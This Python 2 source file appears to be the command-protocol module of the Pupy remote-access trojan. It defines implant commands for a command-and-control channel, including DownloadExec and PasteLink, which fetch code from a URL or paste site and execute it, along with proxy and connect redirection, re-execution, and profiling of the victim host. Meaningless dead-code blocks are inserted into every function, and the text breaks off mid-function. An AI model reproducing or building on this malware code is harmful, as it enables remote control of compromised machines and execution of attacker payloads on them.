__all__ = ('Command', 'Poll', 'Ack', 'Idle', 'SystemStatus', 'Sleep', 'CheckConnect', 'Reexec', 'Exit', 'Disconnect', 'Policy', 'Kex', 'SystemInfo', 'SetProxy', 'Connect', 'DownloadExec', 'PasteLink', 'OnlineStatus', 'PortQuizPort', 'OnlineStatusRequest', 'PupyState', 'CustomEvent', 'ConnectablePort', 'Error', 'SystemInfoEx', 'ConnectEx', 'RegisterHostnameId', 'DataTransferControl', 'DataTransferPayload', 'InBandExecute', 'ParcelInvalidCrc', 'ParcelInvalidPayload', 'ParcelInvalidCommand', 'Parcel', 'PackError', 'PayloadTooBig', 'UnregisteredTargetId', 'from_bytes', 'to_bytes', 'AddressTable')
import struct
import netaddr
import re
import base64
import binascii
import time
import datetime
import platform
import uuid
import urlparse
import socket
from network.lib.picocmd import baseconv, dns_encoder, dns_encoder_table
try:
    import psutil
except ImportError:
    psutil = None
try:
    import uidle
except ImportError:
    uidle = None
try:
    from network.lib import online
except ImportError:
    online = None

def unpack_ip_address(packed):
    if False:
        while True:
            i = 10
    if len(packed) == 4:
        return netaddr.IPAddress(netaddr.strategy.ipv4.packed_to_int(packed), 4)
    elif len(packed) == 16:
        return netaddr.IPAddress(netaddr.strategy.ipv6.packed_to_int(packed), 6)
    else:
        raise NotImplementedError('Only 4 and 16 bytes are supported')

class PackError(Exception):
    pass

class PayloadTooBig(Exception):
    __slots__ = ('required_len', 'max_len')

    def __init__(self, message, required_len, max_len):
        if False:
            print('Hello World!')
        return super(PayloadTooBig, self).__init__(message.format(required_len=required_len, max_len=max_len))
        self.required_len = required_len
        self.max_len = max_len

class UnregisteredTargetId(PackError):
    pass

class AddressTable(object):
    __slots__ = ('table', 'auto_target_id')

    def __init__(self):
        if False:
            i = 10
            return i + 15
        self.table = {}
        self.auto_target_id = 0

    def get_target_id(self, address):
        if False:
            i = 10
            return i + 15
        if address in self.table:
            return self.table[address]
        raise UnregisteredTargetId(address)

    def get_address(self, target_id):
        if False:
            for i in range(10):
                print('nop')
        address = None
        for (this_address, this_target_id) in self.table.iteritems():
            if this_target_id == target_id:
                address = this_address
                break
        if address is None:
            raise UnregisteredTargetId(target_id)
        return address

    def _find_free_target_id(self):
        if False:
            i = 10
            return i + 15
        auto_target_id_is_ok = True
        for used_target_id in self.table.itervalues():
            if self.auto_target_id == used_target_id:
                auto_target_id_is_ok = False
                break
        if auto_target_id_is_ok:
            target_id = self.auto_target_id
            self.auto_target_id = (self.auto_target_id + 1) % 65535
            return target_id
        used_target_ids = set(self.table.values())
        for target_id in xrange(65535):
            if target_id not in used_target_ids:
                return target_id
        raise ValueError('No more free slots')

    def register(self, address, target_id=None):
        if False:
            print('Hello World!')
        if target_id is None:
            target_id = self._find_free_target_id()
        self.table[address] = target_id
        return target_id

def from_bytes(bytes):
    if False:
        for i in range(10):
            print('nop')
    return sum((ord(byte) * 256 ** i for (i, byte) in enumerate(bytes)))

def to_bytes(value, size=0):
    if False:
        i = 10
        return i + 15
    value = long(value)
    bytes = []
    while value:
        bytes.append(chr(value % 256))
        value = value >> 8
    bytes = ''.join(bytes)
    bytes += '\x00' * (size - len(bytes))
    return bytes

class EncodingTableUnregisteredElement(KeyError):
    pass

class EncodingTable(object):
    __slots__ = ('_encode', '_decode')

    def __init__(self, *alphabet, **kwargs):
        if False:
            return 10
        start = kwargs.get('start', 0)
        self._decode = dict(enumerate(alphabet, start))
        self._encode = {v: k for (k, v) in self._decode.iteritems()}

    def is_registered(self, value):
        if False:
            i = 10
            return i + 15
        return value in self._encode

    def encode(self, value):
        if False:
            for i in range(10):
                print('nop')
        encoded = self._encode.get(value, None)
        if encoded is None:
            raise EncodingTableUnregisteredElement(value)
        return encoded

    def decode(self, value):
        if False:
            return 10
        decoded = self._decode.get(value, None)
        if decoded is None:
            raise EncodingTableUnregisteredElement(value)
        return decoded

class Command(object):
    __slots__ = ('session_required', 'internet_required')
    session_required = False
    internet_required = False

    def pack(self):
        if False:
            return 10
        return b''

    @staticmethod
    def unpack(data):
        if False:
            print('Hello World!')
        return (Command(), 0)

    def get_dict(self):
        if False:
            i = 10
            return i + 15
        return {slot: getattr(self, slot) for slot in self.__slots__}

    def __repr__(self):
        if False:
            i = 10
            return i + 15
        return '{' + self.__class__.__name__ + ': ' + ' '.join(('{}={}'.format(slot.upper(), getattr(self, slot)) for slot in self.__slots__)) + '}'

class Poll(Command):
    __slots__ = ()

    @staticmethod
    def unpack(data):
        if False:
            print('Hello World!')
        return (Poll(), 0)

    def __repr__(self):
        if False:
            for i in range(10):
                print('nop')
        return '{POLL}'

class SystemStatus(Command):
    __slots__ = ('cpu', 'users', 'mem', 'listen', 'remote', 'idle')

    @staticmethod
    def unpack(data):
        if False:
            while True:
                i = 10
        return (SystemStatus(*struct.unpack_from('BBBBBB', data)), 6)

    def __init__(self, cpu=None, users=None, mem=None, listen=None, remote=None, idle=None):
        if False:
            print('Hello World!')
        if cpu is None:
            try:
                self.cpu = int(psutil.cpu_percent())
            except:
                self.cpu = 0
        else:
            self.cpu = int(cpu)
        if users is None:
            try:
                self.users = len(psutil.users())
            except:
                self.users = 0
        else:
            self.users = int(users)
        if self.users > 255:
            self.users = 255
        if mem is None:
            try:
                self.mem = int(psutil.virtual_memory().percent)
            except:
                self.mem = 0
        else:
            self.mem = int(mem)
        net_connections = None
        if listen is None or remote is None:
            try:
                net_connections = psutil.net_connections()
            except:
                pass
        if listen is None:
            if net_connections:
                self.listen = len(set([x.laddr[1] for x in net_connections if x.status == 'LISTEN']))
            else:
                self.listen = 0
        else:
            self.listen = int(listen)
        if self.listen > 255:
            self.listen = 255
        if remote is None:
            if net_connections:
                self.remote = len(set([x.raddr for x in net_connections if x.status == 'ESTABLISHED' and x.raddr[0] not in ('127.0.0.1', '::ffff:127.0.0.1')]))
            else:
                self.remote = 0
        else:
            self.remote = int(remote)
        if self.remote > 255:
            self.remote = 255
        if idle is None:
            if uidle is None:
                self.idle = True
            else:
                try:
                    idle = uidle.get_idle()
                    if idle is None:
                        self.idle = True
                    else:
                        self.idle = idle > 60 * 10
                except:
                    self.idle = True
        else:
            self.idle = bool(idle)

    def get_dict(self):
        if False:
            print('Hello World!')
        return {'cpu': self.cpu, 'mem': self.mem, 'listen': self.listen, 'remote': self.remote, 'users': self.users, 'idle': self.idle}

    def pack(self):
        if False:
            for i in range(10):
                print('nop')
        return struct.pack('BBBBBB', self.cpu, self.users, self.mem, self.listen, self.remote, self.idle)

    def __repr__(self):
        if False:
            print('Hello World!')
        return ('{{SS: CPU:{cpu}% MEM:{mem}% L:{listen} ' + 'E:{remote} U:{users} I:{idle}}}').format(**self.get_dict())

class Ack(Command):
    __slots__ = ('amount',)

    def __init__(self, amount=0):
        if False:
            i = 10
            return i + 15
        self.amount = amount

    def pack(self):
        if False:
            print('Hello World!')
        return chr(self.amount)

    @staticmethod
    def unpack(data):
        if False:
            return 10
        return (Ack(amount=ord(data[0])), 1)

    def __repr__(self):
        if False:
            print('Hello World!')
        return '{{ACK ({})}}'.format(self.amount)

class Idle(Command):
    __slots__ = ()

    @staticmethod
    def unpack(data):
        if False:
            for i in range(10):
                print('nop')
        return (Idle(), 0)

    def __repr__(self):
        if False:
            while True:
                i = 10
        return '{IDLE}'

class Sleep(Command):
    __slots__ = ('timeout',)

    @staticmethod
    def unpack(data):
        if False:
            return 10
        return (Sleep(struct.unpack_from('<H', data)[0]), struct.calcsize('<H'))

    def pack(self):
        if False:
            i = 10
            return i + 15
        return struct.pack('<H', self.timeout)

    def __init__(self, timeout=30):
        if False:
            for i in range(10):
                print('nop')
        self.timeout = int(timeout)

    def __repr__(self):
        if False:
            i = 10
            return i + 15
        return '{{SLEEP: {}}}'.format(self.timeout)

class CheckConnect(Command):
    __slots__ = ('host', 'port_start', 'port_end')

    @staticmethod
    def unpack(data):
        if False:
            for i in range(10):
                print('nop')
        (host, port_start, port_end) = struct.unpack_from('IHH', data)
        host = netaddr.IPAddress(host)
        return (CheckConnect(host, port_start, port_end), struct.calcsize('IHH'))

    def __init__(self, host, port_start, port_end):
        if False:
            while True:
                i = 10
        try:
            self.host = netaddr.IPAddress(host)
        except:
            self.host = netaddr.IPAddress(socket.gethostbyname(host))
        self.port_start = port_start
        self.port_end = None if port_end == 0 else port_end

    def pack(self):
        if False:
            for i in range(10):
                print('nop')
        return struct.pack('IHH', int(self.host), int(self.port_start), int(self.port_end))

    def __repr__(self):
        if False:
            i = 10
            return i + 15
        return '{{CHECK: {}:{}-{}}}'.format(self.host, self.port_start, self.port_end)

class Reexec(Command):
    __slots__ = ()

    @staticmethod
    def unpack(data):
        if False:
            i = 10
            return i + 15
        return (Reexec(), 0)

    def __repr__(self):
        if False:
            return 10
        return '{REEXEC}'

class Exit(Command):
    __slots__ = ()

    @staticmethod
    def unpack(data):
        if False:
            return 10
        return (Exit(), 0)

    def __repr__(self):
        if False:
            print('Hello World!')
        return '{EXIT}'

class Disconnect(Command):
    __slots__ = ()

    @staticmethod
    def unpack(data):
        if False:
            return 10
        return (Disconnect(), 0)

    def __repr__(self):
        if False:
            print('Hello World!')
        return '{DISCONNECT}'

class Policy(Command):
    __slots__ = ('timestamp', 'poll', 'kex')

    def __init__(self, poll, kex, timestamp=None):
        if False:
            i = 10
            return i + 15
        self.timestamp = timestamp or time.time()
        self.poll = poll
        self.kex = kex

    def pack(self):
        if False:
            i = 10
            return i + 15
        field = int(bool(self.kex)) << 31 | self.poll & (1 << 30) - 1
        return struct.pack('>II', field, self.timestamp)

    def __repr__(self):
        if False:
            print('Hello World!')
        return '{{POLICY: POLL={} TIME={} KEX={}}}'.format(self.poll, self.timestamp, self.kex)

    @staticmethod
    def unpack(data):
        if False:
            for i in range(10):
                print('nop')
        (field, timestamp) = struct.unpack_from('>II', data)
        kex = field >> 31 & 1
        poll = field & (1 << 30) - 1
        return (Policy(poll, kex, timestamp), 8)

class Kex(Command):
    __slots__ = ('parcel',)

    def __init__(self, parcel):
        if False:
            for i in range(10):
                print('nop')
        self.parcel = parcel

    def pack(self):
        if False:
            return 10
        return struct.pack('B', len(self.parcel)) + self.parcel

    def __repr__(self):
        if False:
            i = 10
            return i + 15
        return '{{KEX: Q={}, SPI={:08x}}}'.format(binascii.b2a_hex(self.parcel), self.spi)

    @property
    def spi(self):
        if False:
            while True:
                i = 10
        return struct.unpack('>I', self.parcel[0:4])[0]

    @staticmethod
    def unpack(data):
        if False:
            for i in range(10):
                print('nop')
        length = struct.unpack_from('B', data)[0]
        return (Kex(data[1:1 + length]), 1 + length)

class SystemInfo(Command):
    __slots__ = ('system', 'arch', 'node', 'boottime', 'internal', 'external_ip', 'internet')
    session_required = True
    well_known_os_names = EncodingTable('Linux', 'Windows', 'SunOS', 'android')
    well_known_cpu_archs = EncodingTable('x86', 'x86', 'x64', 'x64', 'arm')
    well_known_machines_equality = {'i386': 'x86', 'i486': 'x86', 'i586': 'x86', 'i686': 'x86', 'x86_64': 'x64', 'amd64': 'x64', 'i86pc': 'x86', 'armv7l': 'arm', 'armv8l': 'arm'}

    def __init__(self, system=None, arch=None, node=None, external_ip=None, internet=False, boottime=None):
        if False:
            i = 10
            return i + 15
        self.system = system or platform.system()
        self.arch = arch or platform.machine().lower()
        self.arch = self.well_known_machines_equality.get(self.arch, self.arch)
        self.node = node or uuid.getnode()
        try:
            if boottime:
                self.boottime = boottime
            else:
                self.boottime = datetime.datetime.fromtimestamp(psutil.boot_time())
        except:
            self.boottime = datetime.datetime.fromtimestamp(0)
        self.internet = bool(internet)
        self.external_ip = external_ip
        if external_ip is not None:
            if external_ip in ['0.0.0.0', u'0.0.0.0', 0, netaddr.IPAddress('0.0.0.0')]:
                self.external_ip = None
            else:
                self.external_ip = netaddr.IPAddress(external_ip)
                if self.external_ip.version == 6:
                    self.external_ip = None
        elif online:
            self.external_ip = online.external_ip(force_ipv4=True)
            self.internet = online.online()

    def pack(self):
        if False:
            print('Hello World!')
        osid = self.well_known_os_names.encode(self.system)
        archid = self.well_known_cpu_archs.encode(self.arch)
        block = osid << 4 | archid << 1 | int(bool(self.internet))
        boottime = int(time.mktime(self.boottime.timetuple()))
        return struct.pack('B', block) + to_bytes(self.node, 6) + struct.pack('>II', int(self.external_ip or 0), boottime)

    def get_dict(self):
        if False:
            return 10
        return {'os': self.system, 'arch': self.arch, 'node': self.node, 'external_ip': self.external_ip, 'internet': self.internet, 'boottime': self.boottime}

    def __repr__(self):
        if False:
            return 10
        return '{{SYS: OS={} ARCH={} NODE={:012X} IP={} INTERNET={} BOOT={}}}'.format(self.system, self.arch, self.node, self.external_ip, self.internet, self.boottime.ctime())

    @staticmethod
    def unpack(data):
        if False:
            print('Hello World!')
        (block, node, rest) = (data[:1], data[1:1 + 6], data[1 + 6:1 + 6 + 8])
        block = ord(block)
        osid = block >> 4 & 7
        archid = block >> 1 & 7
        internet = bool(block & 1)
        node = from_bytes(node)
        ip = 0
        boottime = 0
        try:
            (ip, boottime) = struct.unpack('>II', rest)
            try:
                boottime = datetime.datetime.fromtimestamp(boottime)
            except:
                pass
            try:
                ip = netaddr.IPAddress(ip)
            except:
                pass
        except:
            pass
        return (SystemInfo(system=SystemInfo.well_known_os_names.decode(osid), node=node, arch=SystemInfo.well_known_cpu_archs.decode(archid), internet=internet, external_ip=ip, boottime=boottime), 1 + 6 + 8)

class SetProxy(Command):
    __slots__ = ('scheme', 'ip', 'port', 'user', 'password')
    well_known_proxy_schemes = EncodingTable('none', 'socks4', 'socks5', 'http', 'any', start=1)

    def __init__(self, scheme, ip, port, user=None, password=None):
        if False:
            for i in range(10):
                print('nop')
        if scheme == 'socks':
            scheme = 'socks5'
        self.scheme = scheme
        try:
            self.ip = netaddr.IPAddress(ip)
        except:
            self.ip = netaddr.IPAddress(socket.gethostbyname(ip))
        self.port = int(port)
        self.user = user
        self.password = password
        if self.user and (not self.password):
            self.password = ''

    def pack(self):
        if False:
            for i in range(10):
                print('nop')
        scheme = chr(self.well_known_proxy_schemes.encode(self.scheme))
        ip = struct.pack('>I', int(self.ip))
        port = struct.pack('>H', int(self.port))
        user = self.user or ''
        password = self.password or ''
        user = chr(len(user)) + user
        password = chr(len(password)) + password
        return scheme + ip + port + user + password

    @staticmethod
    def unpack(data):
        if False:
            for i in range(10):
                print('nop')
        sip = struct.calcsize('>BIH')
        (scheme, ip, port) = struct.unpack_from('>BIH', data)
        scheme = SetProxy.well_known_proxy_schemes.decode(scheme)
        ip = netaddr.IPAddress(ip)
        data = data[sip:]
        user = ''
        password = ''
        user_len = ord(data[0])
        if user_len:
            user = data[1:1 + user_len]
        data = data[1 + user_len:]
        pass_len = ord(data[0])
        if pass_len:
            password = data[1:1 + pass_len]
        return (SetProxy(scheme, ip, port, user, password), sip + user_len + pass_len + 2)

    def __repr__(self):
        if False:
            while True:
                i = 10
        if self.scheme == 'none':
            return '{{PROXY: DISABLED}}'
        elif self.scheme == 'any':
            return '{{PROXY: ENABLED}}'
        if self.user and self.password:
            auth = '{}:{}@'.format(self.user, self.password)
        else:
            auth = ''
        return '{{PROXY: {}://{}{}:{}}}'.format(self.scheme, auth, self.ip, self.port)

class Connect(Command):
    __slots__ = ('ip', 'port', 'transport')
    well_known_transports = EncodingTable('obfs3', 'kc4', 'http', 'tcp_cleartext', 'rsa', 'ssl', 'udp_cleartext', 'scramblesuit', 'ssl_rsa', 'ec4', 'ws', 'ecm', start=1)

    def __init__(self, ip, port, transport='ssl'):
        if False:
            while True:
                i = 10
        self.transport = transport
        try:
            self.ip = netaddr.IPAddress(ip)
        except:
            self.ip = netaddr.IPAddress(socket.gethostbyname(ip))
        self.port = int(port)

    def pack(self):
        if False:
            i = 10
            return i + 15
        message = b''
        if self.well_known_transports.is_registered(self.transport):
            code = 1 << 7 | self.well_known_transports.encode(self.transport)
            message = message + struct.pack('B', code)
        else:
            code = len(self.transport)
            if code > 127:
                raise PackError('Transport name {} can not be encoded'.format(self.transport))
            message = message + struct.pack('B', code) + self.transport
        message = message + struct.pack('>I', int(self.ip))
        message = message + struct.pack('>H', int(self.port))
        return struct.pack('B', len(message)) + message

    def __repr__(self):
        if False:
            print('Hello World!')
        return '{{CONNECT: TRANSPORT={} IP={} PORT={}}}'.format(self.transport, self.ip, self.port)

    @staticmethod
    def unpack(data):
        if False:
            i = 10
            return i + 15
        length = struct.unpack_from('B', data)[0]
        data = data[1:1 + length]
        (transport, rest) = (data[:1], data[1:])
        transport = struct.unpack('B', transport)[0]
        if transport & 1 << 7:
            transport = Connect.well_known_transports.decode(transport & (1 << 7) - 1)
        else:
            (transport, rest) = (rest[:transport], rest[transport:])
        (host, port) = (rest[:4], rest[4:])
        host = str(netaddr.IPAddress(struct.unpack('>I', host)[0]))
        port = struct.unpack('>H', port)[0]
        return (Connect(host, port, transport), 1 + length)

class DownloadExec(Command):
    __slots__ = ('proxy', 'url', 'action')
    well_known_downloadexec_action = EncodingTable('pyexec', 'exec', 'sh')
    well_known_downloadexec_scheme = EncodingTable('http', 'https', 'ftp', 'tcp', 'udp', 'tls')

    def __init__(self, url, action='pyexec', proxy=False):
        if False:
            i = 10
            return i + 15
        self.proxy = bool(proxy)
        self.url = url
        self.action = action

    def pack(self):
        if False:
            i = 10
            return i + 15
        try:
            action = self.well_known_downloadexec_action.encode(self.action)
        except:
            raise PackError('Unknown action: {}'.format(self.action))
        url = urlparse.urlparse(self.url)
        try:
            addr = netaddr.IPAddress(url.hostname)
        except:
            addr = netaddr.IPAddress(socket.gethostbyname(url.hostname))
        if not addr.version == 4:
            raise PackError('IPv6 unsupported')
        addr = int(addr)
        if url.port:
            port = int(url.port)
        else:
            port = 0
        path = url.path
        if len(path) > 16:
            raise PackError('Too big url path')
        try:
            scheme = self.well_known_downloadexec_scheme.encode(url.scheme)
        except EncodingTableUnregisteredElement:
            raise PackError('Unknown scheme: {}'.format(url.scheme))
        code = self.proxy << 5 | action << 3 | scheme
        return struct.pack('BIHB', code, addr, port, len(path)) + path

    def __repr__(self):
        if False:
            for i in range(10):
                print('nop')
        return '{{DEXEC: URL={} ACTION={} PROXY={}}}'.format(self.url, self.action, self.proxy)

    @staticmethod
    def unpack(data):
        if False:
            while True:
                i = 10
        bsize = struct.calcsize('BIHB')
        (code, addr, port, plen) = struct.unpack_from('BIHB', data)
        action = DownloadExec.well_known_downloadexec_action.decode(code >> 3 & 3)
        scheme = DownloadExec.well_known_downloadexec_scheme.decode(code & 7)
        proxy = bool(code >> 5 & 1)
        host = str(netaddr.IPAddress(addr))
        port = ':{}'.format(port) if port else '' if scheme in ('http', 'ftp', 'https') else 53
        path = data[bsize:bsize + plen]
        return (DownloadExec('{}://{}{}{}'.format(scheme, host, port, path), action, proxy), bsize + plen)

class PasteLink(Command):
    __slots__ = ('url', 'action')
    internet_required = True
    well_known_paste_services = [('http://pastebin.com/raw/{}', base64.b64decode, base64.b64encode), ('https://phpaste.sourceforge.io/demo/paste.php?download&id={}', lambda x: to_bytes(x), lambda x: str(from_bytes(x))), ('http://ix.io/{}', lambda x: to_bytes(baseconv.base62.decode(x)), lambda x: baseconv.base62.encode(from_bytes(x))), ('https://ghostbin.com/paste/{}/download', lambda x: to_bytes(baseconv.base36.decode(x)), lambda x: baseconv.base36.encode(from_bytes(x))), ('https://hastebin.com/raw/{}', lambda x: to_bytes(baseconv.base62.decode(x)), lambda x: baseconv.base62.encode(from_bytes(x))), ('http://vpaste.net/{}', lambda x: to_bytes(baseconv.base62.decode(x)), lambda x: baseconv.base62.encode(from_bytes(x))), ('http://dpaste.com/{}.txt', lambda x: to_bytes(baseconv.base62.decode(x)), lambda x: baseconv.base62.encode(from_bytes(x))), ('http://paste.openstack.org/raw/{}/', lambda x: to_bytes(long(x)), lambda x: str(from_bytes(x))), ('https://friendpaste.com/{}/raw', lambda x: to_bytes(baseconv.base62.decode(x)), lambda x: baseconv.base62.encode(from_bytes(x))), ('http://lpaste.net/raw/{}', lambda x: to_bytes(long(x)), lambda x: str(from_bytes(x)))]
    well_known_paste_services_encode = {k: i for (i, k) in enumerate(well_known_paste_services)}
    well_known_paste_services_decode = {i: k for (k, i) in well_known_paste_services_encode.iteritems()}
    well_known_pastebin_action = EncodingTable('pyexec', 'exec', 'sh')

    def __init__(self, url, action='pyexec'):
        if False:
            for i in range(10):
                print('nop')
        self.url = url
        self.action = action

    def pack(self):
        if False:
            return 10
        message = b''
        well_known_found = False
        if not self.well_known_pastebin_action.is_registered(self.action):
            raise PackError('User-defined actions are not supported')
        for ((service, encode, decode), code) in self.well_known_paste_services_encode.iteritems():
            match = re.match(service.format('(.*)'), self.url)
            if match:
                paste = encode(match.groups()[0])
                message = struct.pack('BB', 1 << 7 | self.well_known_pastebin_action.encode(self.action) << 5 | code, len(paste)) + paste
                well_known_found = True
                break
        if not well_known_found:
            if len(self.url) > 32:
                raise PackError('Url size of user-defined urls limited to 25 bytes')
            message = struct.pack('B', self.well_known_pastebin_action.encode(self.action) << 5 | len(self.url)) + self.url
        return message

    def __repr__(self):
        if False:
            print('Hello World!')
        return '{{PASTE: URL={} ACTION={} }}'.format(self.url, self.action)

    @staticmethod
    def unpack(data):
        if False:
            for i in range(10):
                print('nop')
        h1 = struct.unpack_from('B', data)[0]
        if h1 & 1 << 7:
            action = PasteLink.well_known_pastebin_action.decode(h1 >> 5 & 3)
            (urltpl, encode, decode) = PasteLink.well_known_paste_services_decode[h1 & 7]
            (_, length) = struct.unpack_from('BB', data)
            url = urltpl.format(decode(data[2:2 + length]))
            return (PasteLink(url, action), 2 + length)
        else:
            action = PasteLink.well_known_pastebin_action.decode(h1 >> 5 & 3)
            length = h1 & 31
            return (PasteLink(data[1:length + 1], action), 1 + length)

class OnlineStatus(Command):
    __slots__ = ('offset', 'mintime', 'register')

    @staticmethod
    def unpack(data):
        if False:
            for i in range(10):
                print('nop')
        (total, offset, mintime, register) = struct.unpack_from('>BhHI', data)
        return (OnlineStatus(offset, mintime, register), total)

    def __init__(self, offset=None, mintime=None, register=None):
        if False:
            while True:
                i = 10
        if register is None or mintime is None:
            (offset, mintime, register) = online.check()
        self.offset = offset
        self.mintime = mintime
        self.register = register

    def pack(self):
        if False:
            i = 10
            return i + 15
        return struct.pack('>BhHI', 8 + 1, self.offset, self.mintime, self.register)

    def get_dict(self):
        if False:
            while True:
                i = 10
        result = online.bits_to_dict(self.register)
        if self.mintime == 65535:
            result.update({'mintime': 'MAX'})
        else:
            result.update({'mintime': '{:.3f}s'.format(float(self.mintime) / 1000)})
        if result['ntp']:
            if self.offset in (32767, -32768):
                word = 'MAX'
                if self.offset < 0:
                    word = 'MIN'
                result.update({'ntp-offset': word})
            else:
                result.update({'ntp-offset': '{:.3f}s'.format(float(self.offset) / 1000000)})
        else:
            result.update({'ntp-offset': 'N/A'})
        return result

    def __str__(self):
        if False:
            for i in range(10):
                print('nop')
        return '{{ONLINE: {}}}'.format(' '.join(('{}={}'.format(k.upper(), v if type(v) in (int, str, unicode, bool) else any([x for x in v.itervalues()])) for (k, v) in self.get_dict().iteritems())))

class PortQuizPort(Command):
    __slots__ = ('ports',)

    @staticmethod
    def unpack(data):
        if False:
            for i in range(10):
                print('nop')
        (ports_count,) = struct.unpack_from('B', data)
        ports = struct.unpack_from('>' + 'H' * ports_count, data[1:])
        return (PortQuizPort(ports), 1 + ports_count * 2)

    def __init__(self, ports):
        if False:
            for i in range(10):
                print('nop')
        self.ports = [int(x) for x in ports]

    def pack(self):
        if False:
            i = 10
            return i + 15
        ports_count = len(self.ports)
        ports = struct.pack('>' + 'H' * ports_count, *self.ports)
        ports_count = struct.pack('B', ports_count)
        return ports_count + ports

    def __str__(self):
        if False:
            print('Hello World!')
        return '{{PORTQUIZ: {}}}'.format(','.join((str(x) for x in sorted(self.ports))))

class OnlineStatusRequest(Command):
    __slots__ = ()

    @staticmethod
    def unpack(data):
        if False:
            return 10
        return (OnlineStatusRequest(), 0)

    def __repr__(self):
        if False:
            return 10
        return '{ONLINE-STATUS-REQUEST}'

class PupyState(Command):
    __slots__ = ('connected', 'pstore_dirty', 'has_ipv6', 'support_connect_v2', 'has_emergency_mode')
    IS_CONNECTED = 1 << 0
    IS_DIRTY = 1 << 1
    HAS_IPV6 = 1 << 2
    SUPPORT_CONNECT_V2 = 1 << 3
    HAS_EMERGENCY_MODE = 1 << 4

    @staticmethod
    def unpack(data):
        if False:
            i = 10
            return i + 15
        (records_count,) = struct.unpack_from('B', data)
        records = struct.unpack_from('B' * records_count, data[1:])
        connected = records[0] & PupyState.IS_CONNECTED
        pstore_dirty = records[0] & PupyState.IS_DIRTY
        has_ipv6 = records[0] & PupyState.HAS_IPV6
        support_connect_v2 = records[0] & PupyState.SUPPORT_CONNECT_V2
        has_emergency_mode = records[0] & PupyState.HAS_EMERGENCY_MODE
        return (PupyState(connected, pstore_dirty, has_ipv6, support_connect_v2, has_emergency_mode), records_count + 1)

    def pack(self):
        if False:
            print('Hello World!')
        records_count = 1
        record = 0
        if self.connected:
            record |= PupyState.IS_CONNECTED
        if self.pstore_dirty:
            record |= PupyState.IS_DIRTY
        if self.has_ipv6:
            record |= PupyState.HAS_IPV6
        if self.support_connect_v2:
            record |= PupyState.SUPPORT_CONNECT_V2
        if self.has_emergency_mode:
            record |= PupyState.HAS_EMERGENCY_MODE
        return struct.pack('B' + 'B' * records_count, records_count, record)

    def __init__(self, connected=False, pstore_dirty=False, has_ipv6=False, support_connect_v2=True, has_emergency_mode=False):
        if False:
            while True:
                i = 10
        self.connected = connected
        self.pstore_dirty = pstore_dirty
        self.has_ipv6 = has_ipv6
        self.support_connect_v2 = support_connect_v2
        self.has_emergency_mode = has_emergency_mode

    def __repr__(self):
        if False:
            return 10
        return '{{PUPY-STATE: CONNECTED={} PSTORE={} IPV6={} CONNV2={} EMERGENCY={}}}'.format(self.connected, self.pstore_dirty, self.has_ipv6, self.support_connect_v2, self.has_emergency_mode)

class ConnectablePort(Command):
    __slots__ = ('ip', 'ports')

    @staticmethod
    def unpack(data):
        if False:
            while True:
                i = 10
        (ip, ports_count) = struct.unpack_from('>IB', data)
        ports = struct.unpack_from('>' + 'H' * ports_count, data[5:])
        ip = netaddr.IPAddress(ip)
        return (ConnectablePort(ip, ports), 4 + 1 + ports_count * 2)

    def __init__(self, ip, ports):
        if False:
            return 10
        try:
            self.ip = netaddr.IPAddress(ip)
        except:
            self.ip = netaddr.IPAddress(socket.gethostbyname(ip))
        self.ports = ports

    def pack(self):
        if False:
            return 10
        ports_count = len(self.ports)
        ports = struct.pack('>' + 'H' * ports_count, *self.ports)
        header = struct.pack('>IB', int(self.ip), ports_count)
        return header + ports

    def __str__(self):
        if False:
            return 10
        return '{{OPEN: {}:{}}}'.format(self.ip, ','.join((str(x) for x in self.ports)))

def isset(flags, flag):
    if False:
        return 10
    return flags & flag == flag

class SystemInfoEx(Command):
    __slots__ = ('version', 'os', 'arch', 'node', 'boottime', 'internet', 'external_ip', 'internal_ip')
    CURRENT_VERSION = 1
    IS_ONLINE = 1 << 4
    HAS_EXTERNAL_IP = 1 << 3
    EXTERNAL_IP_IS_IPV6 = 1 << 2
    HAS_INTERNAL_IP = 1 << 1
    INTERNAL_IP_IS_IPV6 = 1 << 0
    well_known_os_names = EncodingTable('Linux', 'Windows', 'SunOS', 'android')
    well_known_cpu_archs = EncodingTable('unknown', 'x86', 'x64', 'arm', 'mips')
    x86_re = re.compile('i[2-6]86')

    @staticmethod
    def _arch_to_type(arch):
        if False:
            while True:
                i = 10
        arch = arch.lower().strip()
        if SystemInfoEx.x86_re.match(arch) or arch == 'i86pc':
            return 'x86'
        elif arch in ('x86_64', 'amd64'):
            return 'x64'
        elif arch.startswith('arm'):
            return 'arm'
        elif arch.startswith('mips'):
            return 'mips'
        else:
            return 'unknown'

    def _initialize_from_current_system(self):
        if False:
            i = 10
            return i + 15
        self.version = SystemInfoEx.CURRENT_VERSION
        self.os = platform.system()
        self.arch = SystemInfoEx._arch_to_type(platform.machine())
        self.node = uuid.getnode()
        try:
            self.boottime = datetime.datetime.fromtimestamp(psutil.boot_time())
        except:
            self.boottime = datetime.datetime.fromtimestamp(0)
        self.external_ip = online.external_ip()
        self.internet = online.online()
        self.internal_ip = online.internal_ip()

    def __init__(self, version=None, os=None, arch=None, node=None, boottime=None, external_ip=None, internal_ip=None, internet=None):
        if False:
            i = 10
            return i + 15
        if all((var is None for var in (version, os, arch, node, boottime, external_ip, internal_ip, internet))):
            self._initialize_from_current_system()
        else:
            self.version = version
            self.os = os
            self.arch = arch
            self.node = node
            self.boottime = boottime
            self.internet = internet
            if external_ip:
                self.external_ip = netaddr.IPAddress(external_ip)
            else:
                self.external_ip = None
            if internal_ip:
                self.internal_ip = netaddr.IPAddress(internal_ip)
            else:
                self.internal_ip = None

    def pack(self):
        if False:
            for i in range(10):
                print('nop')
        flags = 0
        internal_ip_packed = b''
        external_ip_packed = b''
        if self.internet:
            flags |= SystemInfoEx.IS_ONLINE
        if self.internal_ip is not None and self.internal_ip != self.external_ip:
            flags |= SystemInfoEx.HAS_INTERNAL_IP
            if self.internal_ip.version == 6:
                flags |= SystemInfoEx.INTERNAL_IP_IS_IPV6
            internal_ip_packed = self.internal_ip.packed
        if self.external_ip is not None:
            flags |= SystemInfoEx.HAS_EXTERNAL_IP
            if self.external_ip.version == 6:
                flags |= SystemInfoEx.EXTERNAL_IP_IS_IPV6
            external_ip_packed = self.external_ip.packed
        return b''.join([chr(self.version), chr(SystemInfoEx.well_known_os_names.encode(self.os) << 4 | SystemInfoEx.well_known_cpu_archs.encode(self.arch)), to_bytes(self.node, 6), struct.pack('>I', int(time.mktime(self.boottime.timetuple()))), chr(flags), internal_ip_packed, external_ip_packed])

    @staticmethod
    def _unpack_v1(data):
        if False:
            print('Hello World!')
        version = ord(data[0])
        os_arch = ord(data[1])
